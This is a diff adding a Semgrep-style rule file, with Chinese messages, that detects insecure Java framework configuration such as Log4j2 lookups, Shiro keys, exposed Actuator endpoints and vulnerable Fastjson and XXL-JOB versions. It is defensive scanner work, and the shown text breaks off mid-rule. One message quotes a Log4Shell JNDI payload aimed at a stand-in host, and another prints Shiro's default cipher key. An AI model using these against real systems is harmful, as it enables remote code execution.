@@ -1,0 +1,1683 @@
+rules:
+  # ============================================
+  # P0 - 组件配置安全 - Log4j2
+  # ============================================
+  
+  - id: java-config-log4j2-jndi-lookup
+    patterns:
+      - pattern-regex: '\$\{jndi:'
+    paths:
+      include:
+        - "*.xml"
+        - "*.properties"
+        - "*.yml"
+        - "*.yaml"
+        - "*.java"
+    message: "检测到 Log4j2 JNDI lookup 表达式。CVE-2021-44228 (Log4Shell)：攻击者可通过 VAR_jndi:ldap://evil.com/exp 触发远程代码执行。建议升级 Log4j2 到 2.17.1+ 或设置 formatMsgNoLookups=true"
+    severity: ERROR
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-502"
+      references:
+        - https://logging.apache.org/log4j/2.x/security.html
+
+  - id: java-config-log4j2-message-lookup
+    patterns:
+      - pattern-regex: '\$\{[a-z]+:'
+    paths:
+      include:
+        - "*.xml"
+        - "*.properties"
+        - "*.java"
+    message: "检测到 Log4j2 lookup 表达式。Log4j2 支持 VAR_ctx:, VAR_env:, VAR_sys: 等 lookup，可能导致信息泄露或 RCE。建议升级到 2.17.1+ 或禁用 lookup。"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-502"
+
+  - id: java-config-log4j2-version-vulnerable
+    patterns:
+      - pattern-regex: 'log4j[^>]*<version>\s*2\.(0|1[0-4])\.|log4j-version>\s*2\.(0|1[0-4])\.'
+    paths:
+      include:
+        - "pom.xml"
+        - "*.gradle"
+    message: "检测到 Log4j2 受影响版本 (< 2.15.0)。CVE-2021-44228 (Log4Shell)：远程代码执行漏洞。建议升级到 2.17.1+。"
+    severity: ERROR
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-502"
+
+  # ============================================
+  # P1 - 组件配置安全 - Spring Security
+  # ============================================
+  
+  - id: java-config-springsecurity-antMatchers-bypass
+    patterns:
+      - pattern-regex: 'antMatchers\s*\(\s*"[^"]+"\s*\)\s*\.\s*(permitAll|authenticated|hasRole)'
+    paths:
+      include:
+        - "*.java"
+        - "*.kt"
+    message: "检测到 Spring Security antMatchers 配置。antMatchers(\"/test\") 可被 /test/ (带斜杠) 绕过，因 Spring WebMVC 的 useTrailingSlashMatch 默认为 true。建议使用 mvcMatchers 或配置 useTrailingSlashMatch=false。"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-287"
+
+  - id: java-config-springsecurity-csrf-disabled
+    patterns:
+      - pattern-regex: 'csrf\s*\(\s*\)\s*\.\s*disable|csrf\(\)\.disable\(\)'
+    paths:
+      include:
+        - "*.java"
+        - "*.kt"
+    message: "检测到 Spring Security CSRF 保护已禁用。CSRF 保护可防止跨站请求伪造攻击。建议仅对无状态 API 禁用 CSRF。"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-352"
+
+  - id: java-config-springsecurity-permitAll-abuse
+    patterns:
+      - pattern-regex: 'antMatchers\s*\(\s*"[^"]+"\s*\)\s*\.\s*permitAll|requestMatchers\s*\([^)]+\)\s*\.\s*permitAll'
+    paths:
+      include:
+        - "*.java"
+        - "*.kt"
+    message: "检测到 Spring Security permitAll 配置。permitAll 允许匿名访问，请确认是否为公开资源。敏感接口应使用 authenticated() 或 hasRole()。"
+    severity: INFO
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-284"
+
+  - id: java-config-springsecurity-doublestar-bypass
+    patterns:
+      - pattern-regex: 'antMatchers\s*\(\s*"\*\*"\s*\)|requestMatchers\s*\(\s*"\*\*"\s*\)'
+    paths:
+      include:
+        - "*.java"
+        - "*.kt"
+    message: "检测到 Spring Security 使用 ** 通配符。CVE-2023-34034：双星号匹配可能导致认证绕过。建议使用 /** 或更精确的路径匹配。"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-287"
+      references:
+        - https://spring.io/security/cve-2023-34034
+
+  - id: java-config-springsecurity-frame-options-disabled
+    patterns:
+      - pattern-regex: 'headers\s*\(\s*\)\s*\.\s*frameOptions\s*\(\s*\)\s*\.\s*disable'
+    paths:
+      include:
+        - "*.java"
+        - "*.kt"
+    message: "检测到 X-Frame-Options 已禁用。禁用后页面可被 iframe 嵌入，可能导致点击劫持攻击。建议保持默认 DENY 或 SAMEORIGIN。"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-1021"
+
+  - id: java-config-springsecurity-session-fixation
+    patterns:
+      - pattern-regex: 'sessionFixation\s*\(\s*\)\s*\.\s*none'
+    paths:
+      include:
+        - "*.java"
+        - "*.kt"
+    message: "检测到 Session 固定防护已禁用。攻击者可利用 Session 固定攻击劫持用户会话。建议使用 sessionFixation().migrateSession() 或 newSession()。"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-384"
+
+  # ============================================
+  # Spring Security 6.x 新特性规则
+  # ============================================
+  
+  - id: java-config-springsecurity6-authorizationHttpRequests
+    patterns:
+      - pattern-regex: 'authorizeHttpRequests\s*\(\s*\)\s*\.\s*(anyRequest|requestMatchers)'
+    paths:
+      include:
+        - "*.java"
+        - "*.kt"
+    message: "检测到 Spring Security 6.x authorizeHttpRequests 配置。请确保 anyRequest().authenticated() 在最后，避免认证绕过。"
+    severity: INFO
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-287"
+
+  - id: java-config-springsecurity6-permitAll-lambda
+    patterns:
+      - pattern-regex: 'permitAll\s*\(\s*\)\s*;|\.permitAll\s*\(\s*\)\s*\)'
+    paths:
+      include:
+        - "*.java"
+        - "*.kt"
+    message: "检测到 Spring Security 6.x permitAll 配置。请确认该路径是否需要公开访问，敏感接口应使用 hasRole() 或 hasAuthority()。"
+    severity: INFO
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-284"
+
+  # ============================================
+  # P1 - 组件配置安全 - Spring Boot
+  # ============================================
+  
+  - id: java-config-actuator-expose-all
+    patterns:
+      - pattern-regex: 'management\.endpoints\.web\.exposure\.include\s*[=:]\s*\*|exposure\.include\s*[=:]\s*\*'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Spring Boot Actuator 暴露所有端点。默认端点包括：heapdump(内存dump)、env(环境变量)、configprops(配置)、mappings(路由) 等敏感信息。建议仅暴露必要端点：management.endpoints.web.exposure.include=health,info"
+    severity: ERROR
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-489"
+      references:
+        - https://docs.spring.io/spring-boot/reference/actuator/index.html
+
+  - id: java-config-actuator-unrestricted
+    patterns:
+      - pattern-regex: 'management\.endpoint\.[a-z]+\.access\s*[=:]\s*unrestricted'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Actuator 端点设置为 unrestricted。除 shutdown/heapdump 外，其他端点默认 unrestricted。建议使用 management.endpoints.access.default=none 控制全局权限。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-489"
+
+  - id: java-config-devtools-enabled
+    patterns:
+      - pattern-regex: 'spring\.devtools\.(restart|livereload)\.enabled\s*[=:]\s*true'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Spring DevTools 开启。生产环境应禁用 DevTools，可能导致远程代码执行。"
+    severity: ERROR
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-489"
+
+  - id: java-config-management-port-same
+    patterns:
+      - pattern-regex: 'management\.server\.port\s*[=:]\s*\$\{server\.port\}|management\.server\.port\s*[=:]\s*8080'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到管理端口与应用端口相同。建议使用独立端口：management.server.port=8081，并配置防火墙限制访问。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-489"
+
+  - id: java-config-banner-enabled
+    patterns:
+      - pattern-regex: 'spring\.main\.banner-mode\s*[=:]\s*(console|log)'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Spring Banner 开启。生产环境应禁用 Banner，可能泄露 Spring 版本信息。建议设置 spring.main.banner-mode=off。"
+    severity: INFO
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-200"
+
+  # ============================================
+  # P0 - 组件配置安全 - Shiro
+  # ============================================
+  
+  - id: java-config-shiro-default-key
+    patterns:
+      - pattern-regex: 'shiro\.(rememberMe|cookie)\.cipherKey|cipherKey\s*[=:]\s*kPH\+bIxk5D2deZiIxcaaaA=='
+    paths:
+      include:
+        - "*.xml"
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+        - "*.java"
+    message: "检测到 Shiro 默认密钥或硬编码密钥。CVE-2016-4437：攻击者可通过 rememberMe Cookie 执行任意代码。建议升级到 Shiro 1.7.0+ 并生成自定义密钥。"
+    severity: ERROR
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-798"
+      references:
+        - https://issues.apache.org/jira/browse/SHIRO-550
+
+  - id: java-config-shiro-ini-rememberme
+    patterns:
+      - pattern-regex: 'rememberMe\s*=\s*true|securityManager\.rememberMeManager'
+    paths:
+      include:
+        - "*.ini"
+    message: "检测到 Shiro rememberMe 配置。请确保使用自定义密钥而非默认密钥。默认密钥：kPH+bIxk5D2deZiIxcaaaA=="
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-798"
+
+  - id: java-config-shiro-url-permission-bypass
+    patterns:
+      - pattern-regex: '/\*\*\s*=\s*anon|/\*\*\s*=\s*authc'
+    paths:
+      include:
+        - "*.ini"
+    message: "检测到 Shiro URL 配置使用 /** 匹配。可能导致权限绕过，建议使用精确路径匹配。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-287"
+
+  # ============================================
+  # P1 - 组件配置安全 - Swagger/Knife4j
+  # ============================================
+  
+  - id: java-config-swagger-enabled
+    patterns:
+      - pattern-regex: 'springfox\.documentation\.swagger\.v2\.enabled\s*[=:]\s*true|spring\.mvc\.swagger\.enabled\s*[=:]\s*true'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Swagger 开启。生产环境应禁用 Swagger，避免暴露 API 接口文档。建议设置 enabled=false 或通过 profile 区分环境。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-489"
+
+  - id: java-config-knife4j-enabled
+    patterns:
+      - pattern-regex: 'knife4j\.(enable|enabled)\s*[=:]\s*true|swagger\.enabled\s*[=:]\s*true'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Knife4j/Swagger 开启。生产环境应禁用，/doc.html 可能未授权访问，暴露所有 API 接口。建议设置 knife4j.enable=false。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-489"
+
+  - id: java-config-swagger-no-auth
+    patterns:
+      - pattern-regex: '@EnableSwagger2|@EnableOpenApi|Docket\.apiInfo'
+    paths:
+      include:
+        - "*.java"
+    message: "检测到 Swagger 配置。请确保生产环境禁用或配置访问认证。Spring Security 需放行 /swagger-resources/**, /v2/api-docs, /doc.html。"
+    severity: INFO
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-489"
+
+  # ============================================
+  # P1 - 组件配置安全 - Druid
+  # ============================================
+  
+  - id: java-config-druid-stat-expose
+    patterns:
+      - pattern-regex: 'druid\.stat-view-servlet\.enabled\s*[=:]\s*true'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Druid 监控页面开启。/druid/index.html 可能未授权访问，泄露 SQL 执行记录、数据源配置等敏感信息。建议配置 IP 白名单或禁用。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-489"
+
+  - id: java-config-druid-no-auth
+    patterns:
+      - pattern-regex: 'druid\.stat-view-servlet\.enabled\s*[=:]\s*true'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Druid 监控开启但无认证配置。建议添加：druid.stat-view-servlet.login-username 和 druid.stat-view-servlet.login-password"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-306"
+
+  - id: java-config-druid-wall-filter-missing
+    patterns:
+      - pattern-regex: 'druid\.filters\s*[=:]\s*[^w]|druid\.filters\s*[=:]\s*$|spring\.datasource\.druid\.filters\s*[=:]\s*[^w]'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Druid 未配置 wall 防火墙过滤器。wall 过滤器可防止 SQL 注入。建议添加：druid.filters=wall,stat"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-89"
+
+  # ============================================
+  # P1 - 组件配置安全 - Fastjson
+  # ============================================
+  
+  - id: java-config-fastjson-autotype-enabled
+    patterns:
+      - pattern-regex: 'SerializerFeature\.WriteClassName|ParserConfig\.getGlobalInstance\(\)\.setAutoTypeSupport\(true\)'
+    paths:
+      include:
+        - "*.java"
+    message: "检测到 Fastjson AutoType 开启。存在反序列化 RCE 风险。建议使用 safeMode：ParserConfig.getGlobalInstance().setSafeMode(true)"
+    severity: ERROR
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-502"
+
+  - id: java-config-fastjson-version-vulnerable
+    patterns:
+      - pattern-regex: 'fastjson[^>]*<version>\s*1\.2\.(1[0-9]|2[0-9]|3[0-9]|4[0-9]|5[0-9]|6[0-9]|7[0-9]|80|81|82)\.'
+    paths:
+      include:
+        - "pom.xml"
+    message: "检测到 Fastjson 受影响版本 (< 1.2.83)。存在多个反序列化 RCE 漏洞。建议升级到 1.2.83+ 或 2.x 版本。"
+    severity: ERROR
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-502"
+
+  # ============================================
+  # P1 - 组件配置安全 - Jackson
+  # ============================================
+  
+  - id: java-config-jackson-defaultTyping
+    patterns:
+      - pattern-regex: 'enableDefaultTyping|activateDefaultTyping'
+    paths:
+      include:
+        - "*.java"
+    message: "检测到 Jackson DefaultTyping 开启。可能导致反序列化 RCE。建议使用白名单：activateDefaultTyping(PolymorphicTypeValidator)"
+    severity: ERROR
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-502"
+
+  - id: java-config-jackson-polymorphic
+    patterns:
+      - pattern-regex: '@JsonTypeInfo\(use\s*=\s*JsonTypeInfo\.Id\.(CLASS|MINIMAL_CLASS)'
+    paths:
+      include:
+        - "*.java"
+    message: "检测到 Jackson 多态类型使用 CLASS 或 MINIMAL_CLASS。可能导致反序列化漏洞。建议使用 NAME 方式并配置白名单。"
+    severity: WARNING
+    languages: [java]
+    metadata:
+      category: security
+      cwe: "CWE-502"
+
+  # ============================================
+  # P1 - 组件配置安全 - Nacos
+  # ============================================
+  
+  - id: java-config-nacos-auth-disabled
+    patterns:
+      - pattern-regex: 'nacos\.config\.(server-addr|namespace)|spring\.cloud\.nacos\.config\.server-addr'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Nacos 配置。默认 Nacos 未启用认证，可能导致未授权访问配置中心。建议启用 nacos.core.auth.enabled=true"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-306"
+
+  - id: java-config-nacos-discovery-no-auth
+    patterns:
+      - pattern-regex: 'spring\.cloud\.nacos\.discovery\.server-addr'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Nacos Discovery 配置。服务发现可能暴露服务信息，建议配置访问认证。"
+    severity: INFO
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-306"
+
+  # ============================================
+  # P1 - 组件配置安全 - Sentinel
+  # ============================================
+  
+  - id: java-config-sentinel-dashboard
+    patterns:
+      - pattern-regex: 'spring\.cloud\.sentinel\.transport\.dashboard'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Sentinel Dashboard 配置。Dashboard 默认无认证，建议配置访问认证或限制内网访问。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-306"
+
+  # ============================================
+  # P1 - 组件配置安全 - Dubbo
+  # ============================================
+  
+  - id: java-config-dubbo-registry-unauth
+    patterns:
+      - pattern-regex: 'dubbo\.registry\.address|dubbo\.registry\.(address|protocol)'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+        - "*.xml"
+    message: "检测到 Dubbo Registry 配置。注册中心（Zookeeper/Nacos）可能未授权访问，建议配置 ACL 认证。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-306"
+
+  - id: java-config-dubbo-port-expose
+    patterns:
+      - pattern-regex: 'dubbo\.protocol\.port\s*[=:]\s*[0-9]+'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Dubbo 端口配置。Dubbo 服务端口暴露可能被恶意调用，建议配置防火墙或 Token 认证。"
+    severity: INFO
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-489"
+
+  # ============================================
+  # P1 - 组件配置安全 - Tomcat
+  # ============================================
+  
+  - id: java-config-tomcat-manager-default
+    patterns:
+      - pattern-regex: 'tomcat-users\.xml|<user username="tomcat"'
+    paths:
+      include:
+        - "*.xml"
+    message: "检测到 Tomcat Manager 配置。默认用户名密码 tomcat/tomcat 应修改，否则可能导致 RCE。"
+    severity: ERROR
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-798"
+
+  - id: java-config-tomcat-ajp-enabled
+    patterns:
+      - pattern-regex: '<Connector\s+protocol="AJP/1\.3"'
+    paths:
+      include:
+        - "server.xml"
+    message: "检测到 Tomcat AJP Connector 开启。CVE-2020-1938 (Ghostcat)：AJP 协议可能导致文件读取/包含。建议禁用或配置 secretRequired。"
+    severity: ERROR
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-22"
+
+  - id: java-config-tomcat-dir-listing
+    patterns:
+      - pattern-regex: 'listings\s*=\s*true|directory\s+listings'
+    paths:
+      include:
+        - "web.xml"
+    message: "检测到 Tomcat 目录列表开启。可能泄露敏感文件列表，建议设置 listings=false。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-538"
+
+  # ============================================
+  # P2 - 组件配置安全 - 数据库连接池
+  # ============================================
+  
+  - id: java-config-hikari-password-plaintext
+    patterns:
+      - pattern-regex: '(spring\.datasource\.(password|hikari\.password))\s*[=:]\s*[^$\{][^ ]+'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到数据库密码明文配置。建议使用环境变量：password: VAR_DB_PASSWORD 或 Jasypt 加密。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-798"
+
+  - id: java-config-jdbc-url-plaintext
+    patterns:
+      - pattern-regex: '(spring\.datasource\.(url|jdbc-url))\s*[=:]\s*(jdbc:mysql|jdbc:postgresql|jdbc:oracle)[^$\{]'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到数据库连接信息明文配置。建议使用环境变量或加密存储敏感信息。"
+    severity: INFO
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-798"
+
+  # ============================================
+  # P2 - 组件配置安全 - Redis
+  # ============================================
+  
+  - id: java-config-redis-password-missing
+    patterns:
+      - pattern-regex: 'spring\.redis\.(host|cluster\.nodes)'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Redis 配置但无密码。建议启用认证：spring.redis.password=VAR_REDIS_PASSWORD"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-306"
+
+  - id: java-config-lettuce-pool-missing
+    patterns:
+      - pattern-regex: 'spring\.redis\.host'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Redis 配置。建议配置连接池以防止连接泄露：spring.redis.lettuce.pool.max-active=8"
+    severity: INFO
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-400"
+
+  # ============================================
+  # P2 - 组件配置安全 - Elasticsearch
+  # ============================================
+  
+  - id: java-config-es-password-plaintext
+    patterns:
+      - pattern-regex: 'spring\.elasticsearch\.rest\.(username|password)\s*[=:]\s*[^$\{]'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Elasticsearch 认证信息明文配置。建议使用环境变量。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-798"
+
+  # ============================================
+  # P2 - 组件配置安全 - MongoDB
+  # ============================================
+  
+  - id: java-config-mongodb-no-auth
+    patterns:
+      - pattern-regex: 'spring\.data\.mongodb\.uri\s*[=:]\s*mongodb://[^@]+@'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 MongoDB URI 明文包含认证信息。建议使用环境变量：spring.data.mongodb.uri=VAR_MONGO_URI"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-798"
+
+  # ============================================
+  # P2 - 组件配置安全 - RabbitMQ
+  # ============================================
+  
+  - id: java-config-rabbitmq-password-plaintext
+    patterns:
+      - pattern-regex: 'spring\.rabbitmq\.password\s*[=:]\s*[^$\{]'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 RabbitMQ 密码明文配置。建议使用环境变量：spring.rabbitmq.password=VAR_RABBITMQ_PASSWORD"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-798"
+
+  # ============================================
+  # P2 - 组件配置安全 - Kafka
+  # ============================================
+  
+  - id: java-config-kafka-no-auth
+    patterns:
+      - pattern-regex: 'spring\.kafka\.bootstrap-servers'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Kafka 配置。建议配置 SASL 认证：spring.kafka.properties.security.protocol=SASL_PLAINTEXT"
+    severity: INFO
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-306"
+
+  # ============================================
+  # P2 - 组件配置安全 - MyBatis
+  # ============================================
+  
+  - id: java-config-mybatis-config-location-missing
+    patterns:
+      - pattern-regex: 'mybatis\.mapper-locations'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 MyBatis 配置。建议检查 Mapper XML 文件是否存在 ${} 注入风险。建议使用 #{} 参数绑定。"
+    severity: INFO
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-89"
+
+  # ============================================
+  # P2 - 组件配置安全 - JPA/Hibernate
+  # ============================================
+  
+  - id: java-config-jpa-show-sql
+    patterns:
+      - pattern-regex: 'spring\.jpa\.show-sql\s*[=:]\s*true|hibernate\.show_sql\s*[=:]\s*true'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 JPA/Hibernate SQL 日志开启。生产环境应关闭，可能泄露敏感 SQL 信息。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-532"
+
+  - id: java-config-jpa-ddl-auto
+    patterns:
+      - pattern-regex: 'spring\.jpa\.hibernate\.ddl-auto\s*[=:]\s*(create|create-drop|update)'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 JPA ddl-auto 非安全配置。生产环境应使用 validate 或 none，避免自动修改数据库结构。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-489"
+
+  # ============================================
+  # P2 - 组件配置安全 - Spring Session
+  # ============================================
+  
+  - id: java-config-session-cookie-secure
+    patterns:
+      - pattern-regex: 'server\.servlet\.session\.cookie\.secure\s*[=:]\s*false'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Session Cookie Secure 属性为 false。生产环境应设置 true，防止 Cookie 被 HTTP 劫持。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-614"
+
+  - id: java-config-session-cookie-httponly
+    patterns:
+      - pattern-regex: 'server\.servlet\.session\.cookie\.http-only\s*[=:]\s*false'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Session Cookie HttpOnly 属性为 false。应设置 true，防止 XSS 窃取 Cookie。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-79"
+
+  # ============================================
+  # P0 - 组件配置安全 - XXL-JOB
+  # ============================================
+  
+  - id: java-config-xxljob-no-auth
+    patterns:
+      - pattern-regex: 'xxl\.job\.admin\.addresses|xxl\.job\.executor\.(appname|port)'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 XXL-JOB 配置。XXL-JOB 2.2.0-2.3.0 存在执行器未授权访问漏洞，攻击者可获取服务器权限。建议升级到 2.4.0+ 并配置 accessToken。"
+    severity: ERROR
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-306"
+      references:
+        - https://github.com/xuxueli/xxl-job
+
+  - id: java-config-xxljob-default-token
+    patterns:
+      - pattern-regex: 'xxl\.job\.accessToken\s*[=:]\s*default|xxl\.job\.access\.token\s*[=:]\s*default'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 XXL-JOB 默认 accessToken。攻击者可使用默认 token 未授权访问执行器。建议设置自定义强随机 token。"
+    severity: ERROR
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-798"
+
+  - id: java-config-xxljob-version-vulnerable
+    patterns:
+      - pattern-regex: 'xxl-job[^>]*<version>\s*2\.(2\.[0-9]|3\.[0-0])\.|xxl-job-core[^>]*<version>\s*2\.(2\.[0-9]|3\.[0-0])\.'
+    paths:
+      include:
+        - "pom.xml"
+        - "*.gradle"
+    message: "检测到 XXL-JOB 受影响版本 (2.2.0-2.3.0)。存在执行器未授权访问漏洞，CVE-2024-42681 子任务越权漏洞。建议升级到 2.4.1+。"
+    severity: ERROR
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-287"
+
+  # ============================================
+  # P1 - 组件配置安全 - Apollo
+  # ============================================
+  
+  - id: java-config-apollo-no-auth
+    patterns:
+      - pattern-regex: 'apollo\.meta|apollo\.config-service|app\.id\s*[=:]\s*[a-zA-Z0-9_-]+'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Apollo 配置中心配置。Apollo < 1.6.0 默认无认证，CVE-2024-43397 权限绕过漏洞。建议升级到 2.3.0+ 并启用 apollo.accesskey.secret。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-306"
+      references:
+        - https://github.com/apolloconfig/apollo
+
+  - id: java-config-apollo-admin-no-auth
+    patterns:
+      - pattern-regex: 'apollo-adminservice|apollo-configservice'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+        - "*.xml"
+    message: "检测到 Apollo Admin/Config Service 配置。默认端口 8080/8090 无认证，可泄露所有配置信息。建议开启 admin-service.access.control.enabled=true。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-306"
+
+  # ============================================
+  # P1 - 组件配置安全 - Eureka
+  # ============================================
+  
+  - id: java-config-eureka-no-auth
+    patterns:
+      - pattern-regex: 'eureka\.client\.service-url\.defaultZone|eureka\.server\.enable-self-preservation'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Eureka Server 配置。Eureka 默认无认证，攻击者可获取所有服务注册信息。建议启用 Spring Security 并配置 eureka.client.service-url.defaultZone 认证。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-306"
+
+  - id: java-config-eureka-xstream-rce
+    patterns:
+      - pattern-regex: 'eureka\.client\.(enabled|register-with-eureka|fetch-registry)\s*[=:]\s*true'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Eureka Client 开启。Spring Cloud Netflix Eureka Client 使用 XStream 反序列化，存在 RCE 风险。建议升级 Spring Cloud 版本或配置安全过滤器。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-502"
+
+  # ============================================
+  # P1 - 组件配置安全 - Spring Cloud Gateway
+  # ============================================
+  
+  - id: java-config-gateway-actuator-expose
+    patterns:
+      - pattern-regex: 'spring\.cloud\.gateway\.actuator|management\.endpoint\.gateway\.enabled\s*[=:]\s*true'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
+    message: "检测到 Spring Cloud Gateway Actuator 开启。/actuator/gateway/routes 可泄露所有路由配置。建议禁用或限制访问。"
+    severity: WARNING
+    languages: [yaml]
+    metadata:
+      category: security
+      cwe: "CWE-489"
+
+  - id: java-config-gateway-predicate-injection
+    patterns:
+      - pattern-regex: 'spring\.cloud\.gateway\.routes'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+        - "*.properties"
